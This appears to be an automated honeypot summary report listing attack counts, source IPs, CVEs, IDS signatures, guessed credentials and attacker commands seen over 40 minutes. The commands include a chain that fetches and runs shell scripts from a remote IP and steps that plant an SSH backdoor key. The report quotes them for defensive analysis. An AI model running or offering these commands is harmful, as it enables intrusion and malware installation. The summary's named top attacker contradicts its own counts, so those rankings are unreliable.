Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-19T05:01:36Z
**Timeframe:** 2025-10-19T04:20:01Z to 2025-10-19T05:00:01Z
**Files Used:**
- agg_log_20251019T042001Z.json
- agg_log_20251019T044002Z.json
- agg_log_20251019T050001Z.json

**Executive Summary:**

This report summarizes honeypot activity over a 40-minute period, analyzing data from three log files. A total of 24,308 attacks were recorded. The most targeted services were Cowrie (SSH), Honeytrap, and Suricata (IDS). The top attacking IP address was 187.51.169.178. A variety of CVEs were observed, with CVE-2005-4050 being the most frequent. Attackers attempted numerous commands, primarily focused on reconnaissance and establishing persistent access.

**Detailed Analysis:**

**Attacks by Honeypot:**
- Cowrie: 10603
- Suricata: 4790
- Honeytrap: 5340
- Sentrypeer: 1853
- Ciscoasa: 1072
- Tanner: 245
- Mailoney: 87
- H0neytr4p: 75
- Honeyaml: 64
- Dionaea: 54
- ssh-rsa: 30
- ConPot: 30
- ElasticPot: 18
- Redishoneypot: 17
- Adbhoney: 15
- Dicompot: 11
- Ipphoney: 4

**Top Attacking IPs:**
- 187.51.169.178: 1367
- 38.242.213.182: 1952
- 134.199.195.80: 1005
- 129.212.183.130: 992
- 72.146.232.13: 1224
- 198.23.190.58: 1215
- 23.94.26.58: 1167
- 194.50.16.73: 993
- 198.12.68.114: 850
- 104.248.206.169: 585

**Top Targeted Ports/Protocols:**
- 5060: 1853
- 22: 1961
- TCP/445: 1364
- 7000: 1208
- UDP/5060: 1388
- 8000: 568
- 5903: 226
- 80: 294
- 5901: 115
- 8333: 99

**Most Common CVEs:**
- CVE-2005-4050
- CVE-2019-11500
- CVE-2002-0013
- CVE-2021-3449
- CVE-2025-30208
- CVE-2001-0414
- CVE-2002-1149
- CVE-2024-4577
- CVE-1999-0517
- CVE-2016-20016
- CVE-2021-41773
- CVE-2021-42013

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- uname -a
- whoami
- Enter new UNIX password:
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
- uname -s -v -n -r -m
- cd /data/local/tmp/; busybox wget http://147.93.62.127/w.sh; sh w.sh; curl http://147.93.62.127/c.sh; sh c.sh; wget http://147.93.62.127/wget.sh; sh wget.sh; curl http://147.93.62.127/wget.sh; sh wget.sh; busybox wget http://147.93.62.127/wget.sh; sh wget.sh; busybox curl http://147.93.62.127/wget.sh; sh wget.sh

**Signatures Triggered:**
- ET VOIP MultiTech SIP UDP Overflow
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET WEB_SERVER /etc/passwd Detected in URI
- GPL WEB_SERVER /etc/passwd

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/
- ftpuser/ftppassword
- root/123@Robert
- support/qwerty1
- config/777
- debian/debian2022
- support/123qwe
- nobody/3333

**Files Uploaded/Downloaded:**
- sh
- welcome.jpg)
- writing.jpg)
- tags.jpg)
- wget.sh;
- w.sh;
- c.sh;

**HTTP User-Agents:**
- N/A

**SSH Clients:**
- N/A

**SSH Servers:**
- N/A

**Top Attacker AS Organizations:**
- N/A

**Key Observations and Anomalies:**

- A significant number of attacks are automated, indicated by the high volume of repeated commands and login attempts.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` is a common attempt to install a persistent SSH key for backdoor access.
- The presence of commands related to downloading and executing shell scripts from external sources (`wget`, `curl`, `sh`) suggests attempts to install malware or establish botnet clients.
- The `DoublePulsar` signature indicates exploitation attempts related to the Equation Group's toolset, which is a significant threat.
- There is a mix of broad, untargeted scanning (indicated by the variety of ports) and specific exploit attempts (indicated by CVE-related signatures).
- The lack of HTTP User-Agents, SSH client/server data, and AS organization information may indicate limitations in the current logging setup or that these fields were not present in the analyzed logs.
